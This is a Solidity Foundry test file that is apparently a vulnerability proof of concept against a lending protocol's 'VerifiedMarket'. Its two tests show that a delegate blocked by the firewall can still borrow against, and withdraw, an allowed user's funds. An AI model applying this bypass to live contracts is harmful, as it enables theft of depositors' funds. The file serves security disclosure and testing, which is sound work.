// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import { VerifiedMarketTest } from "./VerifiedMarket.t.sol";

/// Minimal PoC used against a clean clone of exactly/protocol main at c62bf4c.
/// Place this file at test/VerifiedMarketBypassPoC.t.sol inside the target repo.
contract VerifiedMarketBypassPoC is VerifiedMarketTest {
  function test_poc_disallowedDelegateCanBorrowForAllowedBorrower() external {
    market.deposit(5_000e18, BOB);

    vm.startPrank(BOB);
    auditor.enterMarket(market);
    marketWETH.approve(attacker, type(uint256).max);
    vm.stopPrank();

    marketWETH.deposit(100 ether, address(this));
    firewall.allow(attacker, false);

    uint256 attackerBalanceBefore = weth.balanceOf(attacker);

    vm.prank(attacker);
    marketWETH.borrow(1 ether, attacker, BOB);

    assertEq(weth.balanceOf(attacker), attackerBalanceBefore + 1 ether);
    assertGt(marketWETH.previewDebt(BOB), 0);
  }

  function test_poc_disallowedDelegateCanWithdrawFromAllowedOwner() external {
    marketWETH.deposit(10 ether, BOB);

    vm.prank(BOB);
    marketWETH.approve(attacker, type(uint256).max);

    firewall.allow(attacker, false);

    uint256 attackerBalanceBefore = weth.balanceOf(attacker);

    vm.prank(attacker);
    marketWETH.withdraw(10 ether, attacker, BOB);

    assertEq(weth.balanceOf(attacker), attackerBalanceBefore + 10 ether);
    assertEq(marketWETH.balanceOf(BOB), 0);
  }
}
